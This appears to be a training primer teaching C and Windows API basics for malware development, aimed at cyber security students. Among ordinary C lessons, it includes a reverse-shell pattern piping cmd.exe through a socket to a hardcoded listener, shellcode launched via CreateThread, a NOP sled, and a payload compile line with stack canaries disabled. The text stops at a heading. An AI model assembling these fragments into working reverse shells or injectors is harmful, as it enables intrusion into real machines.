# C Programming Primer for Windows Malware Development

> **Audience:** Cert IV Cyber Security students with basic programming knowledge  
> **Goal:** Understand every C concept used in the kill chain code — why each line exists and what it does at the machine level  
> **Prerequisite:** You have written a "Hello World" in Python or Java and understand variables and `if` statements.

---

## Table of Contents

1. [C Basics Used in the Code](#1-c-basics-used-in-the-code)
2. [Pointers and Memory](#2-pointers-and-memory)
3. [Windows Data Types](#3-windows-data-types)
4. [Structures in C](#4-structures-in-c)
5. [Windows API Calling Conventions](#5-windows-api-calling-conventions)
6. [String Handling in C](#6-string-handling-in-c)
7. [Compilation Basics](#7-compilation-basics)

---

## 1. C Basics Used in the Code

### 1.1 #include and Header Files

C is a small language. The core language knows almost nothing about the operating system, networking, or even how to print text. All of that functionality comes from **libraries**, and the way you tell the compiler which libraries you need is through `#include`.

```c
#include <windows.h>      // Core Windows API: processes, threads, memory
#include <winsock2.h>     // Windows socket programming
#include <stdio.h>        // Standard I/O: printf(), sprintf()
#include <stdlib.h>       // Standard library: malloc(), free(), exit()
#include <string.h>       // String functions: strlen(), strcpy(), memset()
```

**How it works:**

When you write `#include <filename.h>`, the C preprocessor literally **copies and pastes** the entire contents of that header file into your source file at that exact location, before the compiler even sees your code.

```c
// What you write:
#include <stdio.h>
int main() { printf("Hello\n"); }

// What the compiler actually sees (conceptually):
// [entire contents of stdio.h pasted here]
int main() { printf("Hello\n"); }
```

**Why this matters:**
- Header files contain **function declarations** (prototypes) so the compiler knows what arguments `printf()` expects.
- They contain **macro definitions** (like `NULL`, `SOCKET_ERROR`, `INVALID_SOCKET`).
- They contain **structure definitions** (like `sockaddr_in`, `STARTUPINFOA`).

> **Without the right `#include`, your code won't compile** because the compiler won't recognize the function names or types you're using.

---

### 1.2 #define Macros (like LISTENER_IP, LISTENER_PORT)

A `#define` is a **textual substitution** performed by the preprocessor. It is not a variable. It does not take up memory at runtime. It is a find-and-replace that happens before compilation.

```c
#define LISTENER_IP   "192.168.1.10"
#define LISTENER_PORT 4444
#define BUFFER_SIZE   4096
```

**What the compiler sees:**

```c
// Your code:
connect(sock, LISTENER_IP, LISTENER_PORT);
char buffer[BUFFER_SIZE];

// After preprocessing:
connect(sock, "192.168.1.10", 4444);
char buffer[4096];
```

**Why use macros instead of variables?**

1. **No memory overhead** — The value is baked directly into the machine code.
2. **Can be used where variables cannot** — You can't write `char buffer[size]` if `size` is a variable (in standard C89), but you can if it's a macro.
3. **Easy to change** — Change one `#define` at the top, and it propagates everywhere.

**Macros with parameters (function-like macros):**

```c
#define MAKEWORD(low, high) \
    ((WORD)(((BYTE)(low)) | ((WORD)((BYTE)(high))) << 8))

// Usage:
MAKEWORD(2, 2)   // Expands to: ((WORD)(((BYTE)(2)) | ((WORD)((BYTE)(2))) << 8))
```

> **Red Team relevance:** Malware authors use macros heavily to make configuration changes easy (C2 IP, port, sleep intervals) and to obfuscate constants.

---

### 1.3 main() vs WinMain() vs wmain()

Every C program needs an **entry point** — the first function the operating system calls when your program starts.

#### `main()` — The Standard Entry Point

```c
int main(int argc, char *argv[]) {
    // argc = argument count (including program name)
    // argv = argument vector (array of strings)
    return 0;
}
```

| Parameter | Meaning |
|-----------|---------|
| `argc` | Number of command-line arguments. Always at least `1` because the program name itself counts. |
| `argv` | Array of C strings. `argv[0]` is the program name, `argv[1]` is the first real argument, etc. |
| `return 0;` | Tells the OS the program exited successfully. Non-zero means error. |

**Example:**

```bash
myprogram.exe hello world
```

```
argc = 3
argv[0] = "myprogram.exe"
argv[1] = "hello"
argv[2] = "world"
argv[3] = NULL   (sentinel value marking end of array)
```

#### `WinMain()` — Windows GUI Applications

Console programs use `main()`. Windows GUI programs (with windows, buttons, no console window) use `WinMain()`:

```c
int WINAPI WinMain(
    HINSTANCE hInstance,      // Handle to the current program
    HINSTANCE hPrevInstance,  // Always NULL on modern Windows
    LPSTR lpCmdLine,          // Command line as a single string
    int nCmdShow              // How the window should be shown
) {
    return 0;
}
```

> **Why `WinMain` exists:** Windows needs extra information to set up a GUI process. Also, a GUI program doesn't automatically get a console window.

#### `wmain()` — Unicode Command Line

If you want Unicode (wide-character) command-line arguments, use `wmain()`:

```c
int wmain(int argc, wchar_t *argv[]) {
    // argv contains wide strings (UTF-16)
    return 0;
}
```

| Entry Point | Use Case |
|-------------|----------|
| `main()` | Console application, ANSI arguments |
| `wmain()` | Console application, Unicode arguments |
| `WinMain()` | GUI application, ANSI |
| `wWinMain()` | GUI application, Unicode |

> **Red Team relevance:** Most malware is compiled as a console application with `main()` for simplicity, even if it hides its window later. However, some authors use `WinMain()` to avoid spawning a console window at all.

---

### 1.4 argc/argv Command Line Arguments

Understanding `argc` and `argv` is critical because malware often takes configuration from the command line.

```c
#include <stdio.h>

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Usage: %s <target_ip> <port>\n", argv[0]);
        return 1;
    }

    char *target_ip = argv[1];
    int port = atoi(argv[2]);   // Convert string to integer

    printf("Attacking %s on port %d\n", target_ip, port);
    return 0;
}
```

**Running it:**

```bash
malware.exe 192.168.1.5 4444
```

Output:
```
Attacking 192.168.1.5 on port 4444
```

> **Pitfall:** `argv[argc]` is guaranteed to be `NULL` by the C standard. Accessing `argv[argc + 1]` or reading past `argc` causes **undefined behavior** — usually a crash or reading garbage memory.

---

### 1.5 Return Codes and Error Handling

In C, functions communicate success or failure through **return values**.

**Convention:**
- `0` = success
- Non-zero = failure (specific value often indicates the error type)

```c
SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);

if (sock == INVALID_SOCKET) {
    // socket() failed
    int error = WSAGetLastError();   // Windows-specific: get the error code
    printf("socket() failed with error: %d\n", error);
    return 1;   // Non-zero = error exit code
}
```

**Windows error handling pattern:**

Most Windows API functions return a sentinel value on failure (`NULL`, `FALSE`, `INVALID_SOCKET`, `SOCKET_ERROR`). You immediately check for this and call `GetLastError()` (or `WSAGetLastError()` for Winsock) to learn what went wrong.

```c
BOOL success = SomeWindowsFunction();
if (!success) {
    DWORD err = GetLastError();
    // err is a numeric code. Use FormatMessage() to convert to text.
}
```

---

## 2. Pointers and Memory

Pointers are the single most important and most feared concept in C. In Windows malware development, you cannot avoid them — every Windows API function uses pointers.

### 2.1 What is a Pointer? (LPVOID, HANDLE, etc.)

A **pointer** is a variable that stores a **memory address**.

```
┌─────────────────┐      ┌─────────────────┐
│   Variable x    │      │  Memory Address │
│   Value: 42     │      │  0x0012FF60     │
│   Address:      │◄─────┤  Pointer p      │
│   0x0012FF60    │      │  Value: 0x0012FF60│
└─────────────────┘      └─────────────────┘
```

```c
int x = 42;          // An integer variable
int *p = &x;         // p is a pointer to int. &x means "address of x"

printf("%d\n", x);   // Prints: 42
printf("%d\n", *p);  // Prints: 42 — *p means "value at address p"
```

**Windows pointer types you will see:**

| Type | Meaning | Underlying Type |
|------|---------|-----------------|
| `LPVOID` | **L**ong **P**ointer to **VOID** | `void *` — generic pointer to anything |
| `HANDLE` | Opaque handle to a kernel object | `void *` or `PVOID` |
| `LPSTR` | Long Pointer to **STR**ing (ANSI) | `char *` |
| `LPCSTR` | Long Pointer to **C**onstant **STR**ing | `const char *` |
| `LPWSTR` | Long Pointer to **W**ide **STR**ing | `wchar_t *` |
| `LPCWSTR` | Long Pointer to Constant Wide String | `const wchar_t *` |

> **The `LP` prefix is historical.** In 16-bit Windows, there were "near pointers" (16-bit) and "long pointers" (32-bit). On modern 32/64-bit Windows, `LP` means nothing special — it's just a regular pointer.

---

### 2.2 Dereferencing and Address-of (&)

| Operator | Name | What it does |
|----------|------|-------------|
| `&` | Address-of | Gets the memory address of a variable |
| `*` | Dereference | Follows a pointer to access the value at that address |

```c
int num = 100;
int *ptr = &num;    // ptr now holds the address of num

// Dereferencing:
*ptr = 200;         // Go to the address stored in ptr, write 200 there
printf("%d\n", num); // Prints: 200 (num was modified through ptr)
```

**Pointer arithmetic:**

Adding to a pointer moves it by multiples of the type size:

```c
int arr[3] = {10, 20, 30};
int *p = arr;       // Points to arr[0]

printf("%d\n", *p);     // 10
p++;                    // Moves forward by sizeof(int) bytes (4 bytes)
printf("%d\n", *p);     // 20
```

---

### 2.3 malloc() and free()

In C, all local variables live on the **stack** and are destroyed when the function returns. If you need memory that persists longer, you must allocate it on the **heap**.

```c
#include <stdlib.h>

// Allocate 1024 bytes on the heap
char *buffer = (char *)malloc(1024);

if (buffer == NULL) {
    // Allocation failed (out of memory)
    return 1;
}

// Use the memory...
strcpy(buffer, "Hello, heap!");

// When done, FREE it. Otherwise: MEMORY LEAK.
free(buffer);
buffer = NULL;   // Good practice: null out dangling pointers
```

**Key rules:**
1. Every `malloc()` must have exactly one `free()`.
2. After `free(ptr)`, never use `ptr` again unless you reassign it.
3. `malloc()` returns `void *` (untyped). The `(char *)` cast converts it to the pointer type you need.

> **Red Team relevance:** Malware often allocates large buffers for receiving shellcode or file contents. Failing to `free()` memory causes the process to bloat and potentially crash. Some defensive tools monitor abnormal heap allocation patterns.

---

### 2.4 memset() and Memory Initialization

`malloc()` gives you raw memory — it contains whatever was there before (garbage). `memset()` fills a block of memory with a specific byte value.

```c
#include <string.h>

char buffer[1024];
memset(buffer, 0, sizeof(buffer));   // Fill all 1024 bytes with 0x00
```

**Function signature:**

```c
void *memset(void *ptr, int value, size_t num);
// ptr   = starting address
// value = byte value to write (0 for zeros, 0x90 for NOP sleds)
// num   = how many bytes to fill
```

**Common patterns:**

```c
// Zero out a structure before using it
struct sockaddr_in addr;
memset(&addr, 0, sizeof(addr));

// Create a NOP sled (common in exploit development)
unsigned char sled[100];
memset(sled, 0x90, sizeof(sled));   // 0x90 = x86 NOP instruction
```

> **Why zero memory?** Many Windows API structures have fields you don't care about. If you leave them as garbage, the API may behave unpredictably. Always `memset()` structures to zero before filling the fields you need.

---

### 2.5 Type Casting (LPTHREAD_START_ROUTINE, (HANDLE)sock)

**Type casting** tells the compiler: "Trust me, I know this pointer is really a different type."

```c
// malloc returns void *, but we need a char *
char *buffer = (char *)malloc(256);

// A socket is a SOCKET, but some APIs expect a HANDLE
HANDLE h = (HANDLE)sock;

// CreateThread expects a LPTHREAD_START_ROUTINE function pointer
createThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellcode, NULL, 0, NULL);
```

**Why casting is necessary:**

C is strongly typed. The compiler complains if you pass a `SOCKET` where a `HANDLE` is expected, even though both are just integers/pointers under the hood. The cast silences the compiler.

> **Danger:** A cast does not convert data. It just reinterprets the bits. Casting a `char *` to an `int *` and then dereferencing it will read 4 bytes as an integer — which may be meaningless or cause a crash on unaligned addresses.

---

## 3. Windows Data Types

### 3.1 Why Windows Uses Its Own Types (DWORD, HANDLE, LPVOID, LPCSTR, LPCWSTR)

Microsoft created its own typedefs for two historical reasons:

1. **16-bit to 32-bit transition:** In the early 1990s, Windows moved from 16-bit to 32-bit. Abstract types like `DWORD` and `HANDLE` let Microsoft change their underlying size without breaking every program.
2. **Consistency across compilers:** Different C compilers used different names for the same thing. `unsigned long` might be 32 bits on one compiler and 64 bits on another. `DWORD` is always 32 bits.

**Common Windows types:**

| Type | Definition | Meaning |
|------|-----------|---------|
| `BYTE` | `unsigned char` | 8-bit unsigned integer |
| `WORD` | `unsigned short` | 16-bit unsigned integer |
| `DWORD` | `unsigned long` | 32-bit unsigned integer (**D**ouble **WORD**) |
| `QWORD` | `unsigned long long` | 64-bit unsigned integer (**Q**uad **WORD**) |
| `BOOL` | `int` | Boolean: `TRUE` (1) or `FALSE` (0) |
| `HANDLE` | `void *` | Opaque reference to a kernel object |
| `HWND` | `HANDLE` | Handle to a window |
| `HMODULE` | `HANDLE` | Handle to a loaded DLL |
| `LPVOID` | `void *` | Generic pointer |
| `LPCSTR` | `const char *` | Pointer to constant ANSI string |
| `LPCWSTR` | `const wchar_t *` | Pointer to constant wide string |
| `SIZE_T` | `size_t` | Architecture-sized unsigned integer (32-bit on x86, 64-bit on x64) |

---

### 3.2 ANSI vs Unicode (char vs wchar_t)

Windows supports two character encodings:

#### ANSI (`char`)
- 1 byte per character.
- Uses the system's "code page" (e.g., Windows-1252 for Western Europe).
- Cannot represent all world languages simultaneously.
- Functions have no suffix or an `A` suffix: `CreateFileA`, `MessageBoxA`.

#### Unicode / Wide Characters (`wchar_t`)
- 2 bytes per character (UTF-16 on Windows).
- Can represent virtually all characters in all languages.
- Functions have a `W` suffix: `CreateFileW`, `MessageBoxW`.
- String literals need the `L` prefix: `L"Hello"` instead of `"Hello"`.

```c
// ANSI
char msg[] = "Hello";
MessageBoxA(NULL, msg, "Title", MB_OK);

// Unicode
wchar_t msgW[] = L"Hello";
MessageBoxW(NULL, msgW, L"Title", MB_OK);
```

**The `TCHAR` macros:**

Windows headers define `TCHAR` as a type that becomes `char` or `wchar_t` depending on whether you define `UNICODE` before including headers. Similarly, `_T("hello")` becomes `L"hello"` in Unicode mode.

```c
#ifdef UNICODE
    #define TCHAR wchar_t
    #define _T(x) L##x
#else
    #define TCHAR char
    #define _T(x) x
#endif
```

> **Red Team relevance:** Most malware targets the ANSI versions (`CreateProcessA`, `STARTUPINFOA`) because they are simpler and the `A` suffix explicitly avoids wchar_t headaches. However, modern Windows internals are all Unicode, so some APIs only have `W` versions.

---

### 3.3 The "Hungarian Notation" Prefix System

Hungarian notation is a naming convention where variable names are prefixed with their type. It was heavily promoted at Microsoft in the 1980s–90s.

| Prefix | Type | Example |
|--------|------|---------|
| `b` | `BOOL` | `bSuccess` |
| `c` / `ch` | `char` | `chBuffer` |
| `dw` | `DWORD` | `dwSize` |
| `h` | Handle | `hProcess`, `hThread` |
| `lpsz` | Long Pointer to String, Zero-terminated | `lpszFileName` |
| `lp` | Long Pointer | `lpBuffer` |
| `n` | `int` | `nCount` |
| `p` | Pointer | `pData` |
| `sz` | String, Zero-terminated | `szPath` |
| `w` | `WORD` | `wVersion` |

**Example:**

```c
DWORD dwProcessId;
HANDLE hProcess;
LPSTR lpszCommandLine;
BOOL bResult;
```

> **Modern view:** Hungarian notation is considered outdated in general programming because modern IDEs show types on hover. However, **you will still see it everywhere in Windows API documentation and malware** because the Windows headers themselves use it. Learn to recognize it.

---

## 4. Structures in C

A **structure** (`struct`) is a user-defined data type that groups related variables under one name. Windows APIs are built almost entirely on structures.

---

### 4.1 struct sockaddr_in Explained Field by Field

```c
struct sockaddr_in {
    short          sin_family;       // 2 bytes — Address family
    unsigned short sin_port;         // 2 bytes — Port (network byte order)
    struct in_addr sin_addr;         // 4 bytes — IPv4 address
    char           sin_zero[8];      // 8 bytes — Padding
};
```

**Field-by-field:**

| Field | Type | Purpose |
|-------|------|---------|
| `sin_family` | `short` | Must be `AF_INET` (2) for IPv4 or `AF_INET6` (23) for IPv6. Tells the socket API which address format you're using. |
| `sin_port` | `unsigned short` | The port number. Must be in **network byte order** (use `htons()`). |
| `sin_addr` | `struct in_addr` | The IP address. It is itself a struct containing one field: `unsigned long s_addr`. Must be in network byte order (use `inet_addr()`). |
| `sin_zero` | `char[8]` | Unused padding to make the structure 16 bytes, matching the size of `struct sockaddr`. Must be zeroed. |

**Setting it up correctly:**

```c
struct sockaddr_in addr;
memset(&addr, 0, sizeof(addr));          // Zero everything first

addr.sin_family = AF_INET;
addr.sin_port   = htons(4444);           // Port in network byte order
addr.sin_addr.s_addr = inet_addr("192.168.1.10");  // IP as 32-bit integer
```

> **Common bug:** Forgetting `htons()` on the port. Your code compiles but connects to the wrong port because the bytes are reversed.

---

### 4.2 struct STARTUPINFOA / PROCESS_INFORMATION

These two structures are used with `CreateProcessA()` to start a new program — critical for spawning shells and injecting processes.

#### STARTUPINFOA

```c
typedef struct _STARTUPINFOA {
    DWORD  cb;              // Size of this structure (must set manually)
    LPSTR  lpReserved;
    LPSTR  lpDesktop;
    LPSTR  lpTitle;
    DWORD  dwX;
    DWORD  dwY;
    DWORD  dwXSize;
    DWORD  dwYSize;
    DWORD  dwXCountChars;
    DWORD  dwYCountChars;
    DWORD  dwFillAttribute;
    DWORD  dwFlags;         // Bitmask of options (e.g., STARTF_USESTDHANDLES)
    WORD   wShowWindow;
    WORD   cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;       // Standard input handle
    HANDLE hStdOutput;      // Standard output handle
    HANDLE hStdError;       // Standard error handle
} STARTUPINFOA, *LPSTARTUPINFOA;
```

**Critical fields for malware:**

| Field | Purpose |
|-------|---------|
| `cb` | **Must** be set to `sizeof(STARTUPINFOA)` before calling `CreateProcessA`. |
| `dwFlags` | Controls which other fields are valid. `STARTF_USESTDHANDLES` (0x00000100) means "use the `hStdInput/Output/Error` handles I'm providing." |
| `hStdInput` | Where the new process reads input from. Set this to a **socket handle** to redirect input from the network. |
| `hStdOutput` | Where the new process writes output to. Set this to a **socket handle** to send output over the network. |
| `hStdError` | Same as above but for error messages. |

**Typical malware pattern:**

```c
STARTUPINFOA si;
PROCESS_INFORMATION pi;

memset(&si, 0, sizeof(si));
si.cb = sizeof(si);
si.dwFlags = STARTF_USESTDHANDLES;
si.hStdInput  = (HANDLE)sock;   // Redirect stdin from the socket
si.hStdOutput = (HANDLE)sock;   // Redirect stdout to the socket
si.hStdError  = (HANDLE)sock;   // Redirect stderr to the socket

CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
```

#### PROCESS_INFORMATION

```c
typedef struct _PROCESS_INFORMATION {
    HANDLE hProcess;    // Handle to the new process
    HANDLE hThread;     // Handle to the primary thread
    DWORD  dwProcessId; // Numeric PID (e.g., 1234)
    DWORD  dwThreadId;  // Numeric TID
} PROCESS_INFORMATION, *LPPROCESS_INFORMATION;
```

This structure is **output-only**. `CreateProcessA()` fills it with handles and IDs you can use to monitor or terminate the process.

> **Important:** Close `hProcess` and `hThread` handles with `CloseHandle()` when you no longer need them, or you leak kernel objects.

---

### 4.3 struct SERVICE_STATUS

Used when writing Windows services (persistence mechanisms). The `SetServiceStatus()` function requires this structure.

```c
typedef struct _SERVICE_STATUS {
    DWORD dwServiceType;      // SERVICE_WIN32_OWN_PROCESS, etc.
    DWORD dwCurrentState;     // SERVICE_RUNNING, SERVICE_STOPPED, etc.
    DWORD dwControlsAccepted; // Which control codes the service accepts
    DWORD dwWin32ExitCode;    // Exit code (0 = success)
    DWORD dwServiceSpecificExitCode;
    DWORD dwCheckPoint;       // Progress indicator during long operations
    DWORD dwWaitHint;         // Estimated time (ms) for next checkpoint
} SERVICE_STATUS, *LPSERVICE_STATUS;
```

**Example:**

```c
SERVICE_STATUS status;
memset(&status, 0, sizeof(status));

status.dwServiceType      = SERVICE_WIN32_OWN_PROCESS;
status.dwCurrentState     = SERVICE_RUNNING;
status.dwControlsAccepted = SERVICE_ACCEPT_STOP;
status.dwWin32ExitCode    = NO_ERROR;

SetServiceStatus(hServiceStatus, &status);
```

---

### 4.4 Accessing Structure Members with Dot (.) and Arrow (->)

| Syntax | When to use | Example |
|--------|-------------|---------|
| `.` (dot) | The variable is a **struct** (not a pointer) | `si.cb = sizeof(si);` |
| `->` (arrow) | The variable is a **pointer to a struct** | `pSi->cb = sizeof(STARTUPINFOA);` |

```c
STARTUPINFOA si;        // si is a structure (lives on the stack)
si.cb = sizeof(si);     // Use dot

STARTUPINFOA *pSi = &si; // pSi is a pointer to si
pSi->cb = sizeof(si);    // Use arrow — equivalent to (*pSi).cb
```

**Memory illustration:**

```c
struct sockaddr_in addr;
addr.sin_port = htons(80);        // addr is the struct → dot

struct sockaddr_in *pAddr = &addr;
pAddr->sin_port = htons(80);      // pAddr is a pointer → arrow
(*pAddr).sin_port = htons(80);    // Same thing, more verbose
```

> **Mnemonic:** The arrow `->` looks like it's "pointing" to something inside the structure.

---

## 5. Windows API Calling Conventions

### 5.1 __stdcall vs __cdecl

When you call a function, the **calling convention** determines two things:
1. Who cleans up the stack after the function returns (caller or callee)?
2. How arguments are passed (left-to-right or right-to-left).

| Convention | Stack cleanup | Argument order | Typical use |
|------------|---------------|----------------|-------------|
| `__cdecl` | **Caller** cleans up | Right-to-left | Standard C/C++ default; variadic functions (`printf`) |
| `__stdcall` | **Callee** cleans up | Right-to-left | Windows API; fixed-argument functions |
| `__fastcall` | Callee | First two args in registers | Optimization (rare in malware) |

**Why this matters:**

If the wrong convention is used, the stack becomes corrupted. The program crashes or behaves unpredictably.

```c
// __cdecl — caller cleans up
int __cdecl myFunc(int a, int b);

// __stdcall — callee (the function itself) cleans up
int __stdcall myFunc(int a, int b);
```

---

### 5.2 WINAPI Macro

Windows API functions use the `WINAPI` calling convention, which is just a `#define` for `__stdcall`:

```c
#define WINAPI __stdcall
```

So when you see:

```c
BOOL WINAPI CreateProcessA(...);
DWORD WINAPI GetLastError(void);
```

It means these functions use `__stdcall` — the functions themselves clean up their own arguments from the stack.

**Callback functions** (functions you write that Windows calls) must also use `WINAPI`:

```c
// Windows calls this function when a service control request arrives
VOID WINAPI ServiceCtrlHandler(DWORD dwCtrl) {
    // handle stop/pause/continue
}
```

> **If you forget `WINAPI` on a callback, your program will crash** when Windows tries to return from your function, because the stack will be in an inconsistent state.

---

### 5.3 Callback Functions

A **callback function** is a function you write and pass as an argument to another function, which then "calls you back" later.

**Example — Thread function for `CreateThread`:**

```c
// This function must match the LPTHREAD_START_ROUTINE signature
DWORD WINAPI MyThreadFunc(LPVOID lpParam) {
    printf("Thread running with parameter: %p\n", lpParam);
    return 0;
}

int main() {
    HANDLE hThread = CreateThread(
        NULL,                   // Default security
        0,                      // Default stack size
        MyThreadFunc,           // Callback function pointer
        (LPVOID)1234,           // Parameter passed to thread
        0,                      // Creation flags
        NULL                    // Thread ID (optional)
    );

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    return 0;
}
```

**The signature `LPTHREAD_START_ROUTINE` expands to:**

```c
typedef DWORD (WINAPI *LPTHREAD_START_ROUTINE)(LPVOID lpThreadParameter);
//        ^     ^         ^                          ^
//        |     |         |                          |
//     return  calling   pointer to function      parameter
//     type  convention
```

> **Red Team relevance:** Shellcode injection often uses `CreateThread()` to start execution of injected code. The shellcode address is cast to `LPTHREAD_START_ROUTINE`.

---

## 6. String Handling in C

C has no built-in "string" type. A string is just an array of characters ending with a null byte (`\0`).

```
Memory:
┌────┬────┬────┬────┬────┬────┐
│ H  │ e  │ l  │ l  │ o  │ \0 │
│ 48 │ 65 │ 6C │ 6C │ 6F │ 00 │
└────┴────┴────┴────┴────┴────┘
  0    1    2    3    4    5
```

---

### 6.1 strlen(), strcpy(), strcmp()

#### `strlen()` — String Length

```c
size_t strlen(const char *str);

// Returns the number of characters BEFORE the null terminator
char msg[] = "Hello";
size_t len = strlen(msg);   // Returns 5, NOT 6
```

#### `strcpy()` — String Copy (DANGEROUS)

```c
char *strcpy(char *dest, const char *src);

// Copies src (including null terminator) into dest
// DANGER: Does NOT check if dest is large enough!
char buffer[10];
strcpy(buffer, "This is way too long!");   // BUFFER OVERFLOW!
```

#### `strcmp()` — String Compare

```c
int strcmp(const char *s1, const char *s2);

// Returns 0 if equal
// Returns < 0 if s1 < s2 (alphabetically)
// Returns > 0 if s1 > s2
if (strcmp(argv[1], "--help") == 0) {
    printf("Usage: ...\n");
}
```

---

### 6.2 Wide String Functions (wcslen, wcscmp, _wcsicmp)

For Unicode (`wchar_t`) strings, use the `wcs*` family:

| ANSI | Wide | Purpose |
|------|------|---------|
| `strlen()` | `wcslen()` | Length |
| `strcpy()` | `wcscpy()` | Copy |
| `strcmp()` | `wcscmp()` | Compare (case-sensitive) |
| `_stricmp()` | `_wcsicmp()` | Compare (case-insensitive) |
| `strcat()` | `wcscat()` | Concatenate |

```c
wchar_t msg[] = L"Hello";
size_t len = wcslen(msg);       // Returns 5

if (_wcsicmp(L"Malware.exe", L"MALWARE.EXE") == 0) {
    // Case-insensitive match
}
```

> **Note the `L` prefix:** `L"string"` creates a wide-character string literal. Without it, `"string"` is ANSI.

---

### 6.3 _snprintf() and String Formatting

`sprintf()` and `snprintf()` format data into a string:

```c
char buffer[256];
int n = 123;

// DANGEROUS: sprintf does NOT check buffer size
sprintf(buffer, "The number is %d", n);

// SAFER: _snprintf limits the output (Windows-specific)
_snprintf(buffer, sizeof(buffer), "The number is %d", n);
```

**Common format specifiers:**

| Specifier | Type | Example output |
|-----------|------|----------------|
| `%d` / `%i` | Signed decimal integer | `123`, `-456` |
| `%u` | Unsigned decimal integer | `123` |
| `%x` / `%X` | Hexadecimal | `7b`, `7B` |
| `%p` | Pointer address | `000000000012FF60` |
| `%s` | ANSI string | `Hello` |
| `%S` / `%ls` | Wide string | `Hello` |
| `%c` | Single character | `A` |
| `%%` | Literal percent sign | `%` |

**Formatting IP addresses:**

```c
unsigned long ip = inet_addr("192.168.1.10");
printf("IP as hex: 0x%08X\n", ip);   // Prints: 0x0A01A8C0 (network order!)
```

---

### 6.4 Why C Strings Are Dangerous (Buffer Overflows)

C strings are the root cause of countless security vulnerabilities. Here's why:

```c
void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);   // If input is > 63 chars, we overflow!
}
```

**What happens in a buffer overflow:**

```
Stack before overflow:
┌────────────────────────────┐
│ buffer[64]                 │
├────────────────────────────┤
│ Saved base pointer (8 bytes)│
├────────────────────────────┤
│ Return address (8 bytes)   │  ← Where to go when function returns
└────────────────────────────┘

Stack after overflow with 80 'A's:
┌────────────────────────────┐
│ AAAAAAAAAAAAAAAAAAAAAAAA...│
├────────────────────────────┤
│ AAAAAAAAAAAAAAAA           │  ← Base pointer overwritten
├────────────────────────────┤
│ AAAAAAAAAAAAAAAA           │  ← Return address overwritten!
└────────────────────────────┘
```

By overflowing `buffer`, the attacker overwrites the **return address** on the stack. When the function returns, the CPU jumps to an attacker-controlled address — typically to shellcode placed in the buffer.

**Mitigations:**
- **Stack canaries** (`/GS`) — A random value placed before the return address. If it's modified, the program aborts.
- **DEP/NX** — Memory pages are marked non-executable. The stack cannot be executed.
- **ASLR** — Randomizes where code and data are loaded in memory, making hardcoded addresses useless.
- **Safe functions** — Use `strncpy`, `_snprintf`, `StringCchCopy` instead of `strcpy`, `sprintf`.

> **Red Team relevance:** Understanding buffer overflows is fundamental to exploit development. Understanding mitigations (`/GS`, ASLR, DEP) is fundamental to writing reliable exploits.

---

## 7. Compilation Basics

### 7.1 What is a Compiler? (cl.exe)

A **compiler** translates human-readable source code into machine code (binary instructions the CPU executes).

On Windows, the Microsoft C/C++ compiler is **`cl.exe`** (included with Visual Studio or the Build Tools).

```bash
cl.exe main.c
```

This performs two steps:
1. **Compile** `main.c` → `main.obj` (object file)
2. **Link** `main.obj` → `main.exe` (executable)

---

### 7.2 What is a Linker?

Compilation produces **object files** (`.obj`), which contain machine code but are not yet runnable. Object files may reference functions defined in other files or libraries (e.g., `printf` from the C runtime, `socket` from `ws2_32.dll`).

The **linker** resolves these references and combines everything into a single executable:

```
main.obj ──┐
           ├──► linker ──► main.exe
ws2_32.lib─┘           (with imports from ws2_32.dll)
```

**Static linking** — The library code is copied into your `.exe`. The resulting file is larger but has no external dependencies.

**Dynamic linking** — Your `.exe` contains a list of DLL names and function names. At runtime, Windows loads those DLLs and patches the addresses. This keeps executables small.

---

### 7.3 Object Files (.obj) vs Executables (.exe)

| File Type | Extension | Contains | Runnable? |
|-----------|-----------|----------|-----------|
| Source | `.c`, `.cpp` | Human-readable code | No |
| Object | `.obj` | Machine code + unresolved symbols | No |
| Library | `.lib` | Collection of object files | No |
| Executable | `.exe`, `.dll` | Fully linked machine code | Yes |

---

### 7.4 Static Linking with #pragma comment(lib, "...")

In Visual C++, you can tell the linker which library to link using a pragma inside your source code:

```c
#pragma comment(lib, "ws2_32.lib")   // Link against Winsock
#pragma comment(lib, "user32.lib")   // Link against User32 (MessageBox)
#pragma comment(lib, "kernel32.lib") // Link against Kernel32 (most core APIs)
#pragma comment(lib, "advapi32.lib") // Link against Advapi32 (services, registry)
```

**Why use this?** Instead of passing `/link ws2_32.lib` on the command line, the directive is embedded in the source. This makes the code self-documenting and easier to compile with a simple `cl.exe main.c`.

**The `.lib` vs `.dll` relationship:**

| File | Role |
|------|------|
| `ws2_32.dll` | The actual DLL loaded at runtime containing the socket functions. |
| `ws2_32.lib` | An "import library" — a tiny file that tells the linker "these functions live in ws2_32.dll." |

---

### 7.5 Compiler Flags (/O1 /GS-)

Compiler flags control optimization, security features, and output format.

| Flag | Meaning | Red Team Relevance |
|------|---------|-------------------|
| `/O1` | Optimize for size | Smaller executable, harder to analyze |
| `/O2` | Optimize for speed | Faster code, may be larger |
| `/Od` | Disable optimization | Easier to debug |
| `/GS-` | Disable stack canaries | Removes `/GS` protection (dangerous but useful for certain payloads) |
| `/MT` | Static link C runtime | No dependency on `msvcrt.dll` — more portable |
| `/MD` | Dynamic link C runtime | Smaller but requires `msvcrt.dll` or `vcruntime140.dll` |
| `/Zi` | Generate debug info | Creates `.pdb` file for debugging |
| `/Fe:` | Specify output file name | `cl.exe main.c /Fe:malware.exe` |

**Example command line:**

```bash
cl.exe /O1 /GS- /MT /Fe:payload.exe main.c
```

This compiles `main.c` into `payload.exe` with:
- Size optimization (`/O1`)
- Stack canaries disabled (`/GS-`) — **removes a security mitigation**
- Static C runtime (`/MT`) — no external CRT dependency

> **Warning:** `/GS-` makes your code vulnerable to stack buffer overflows. In real defensive security work, you should NEVER disable stack canaries. In Red Team training, you may see it used in proof-of-concept exploits.

---

## 7.5 Real-World Priming

### The Lab Lie

**What the lab lets you believe:** Learning C syntax, pointers, and Windows API calls is the foundation of malware development — and that this alone prepares you for real-world tool development.

**What the lab hides from you:** Real malware development is not about knowing `CreateProcessA` syntax. It is about **engineering** — designing systems that are maintainable, evolvable, and robust. A 1000-line `main()` function with hardcoded IPs is not engineering — it is a script. Professional malware is modular, uses configuration files, has error handling for every API call, and is designed to be updated in the field without recompilation.

### How Lab C Skills Die in Production

